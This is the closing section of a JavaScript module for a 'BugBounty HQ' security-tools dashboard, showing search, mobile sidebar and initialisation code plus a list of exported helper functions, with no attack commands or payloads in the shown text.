    overlay.classList.add('open');
  }

  /* ══════════════════════════════════════════
     GLOBAL SEARCH
     ══════════════════════════════════════════ */
  function initSearch() {
    const input = $('global-search');
    if (!input) return;
    input.addEventListener('input', () => {
      searchQuery = input.value;
      if (currentSection !== 'tools') { navigate('tools'); }
      else { populateToolsGrid(); }
    });
  }

  /* ══════════════════════════════════════════
     MOBILE TOGGLE
     ══════════════════════════════════════════ */
  function initMobile() {
    const btn = $('mobile-toggle');
    const sidebar = document.getElementById('sidebar');
    if (!btn || !sidebar) return;
    btn.addEventListener('click', () => {
      sidebar.classList.toggle('open');
    });
    document.addEventListener('keydown', e => {
      if (e.key === 'Escape') {
        sidebar.classList.remove('open');
        $('modal-overlay').classList.remove('open');
        $('cc-overlay').classList.remove('open');
      }
    });
  }

  /* ══════════════════════════════════════════
     INIT
     ══════════════════════════════════════════ */
  function init() {
    buildSidebar();
    initSearch();
    initMobile();

    // Update sidebar total count
    const sbTotal = $('sb-total');
    if (sbTotal) sbTotal.textContent = TOOLS.length + '+';

    // Initial render
    renderDashboard();

    console.log('%c🛡️ BugBounty HQ loaded!', 'color:#4f8eff;font-size:16px;font-weight:bold');
    console.log('%c' + TOOLS.length + ' tools ready', 'color:#22c55e;font-size:12px');
  }

  document.addEventListener('DOMContentLoaded', init);

  /* Public API */
  return {
    navigate, openTool, closeModal,
    copyCmd, copyText,
    openCommandCenter,
    copyWorkflow, runWorkflow, generateWorkflowCmds,
    b64Encode, b64Decode, urlEncode, urlDecode,
    computeHash, genRevShell, calcCIDR, decodeJWT,
    htmlEncode, htmlDecode, genRandom,
  };
})();
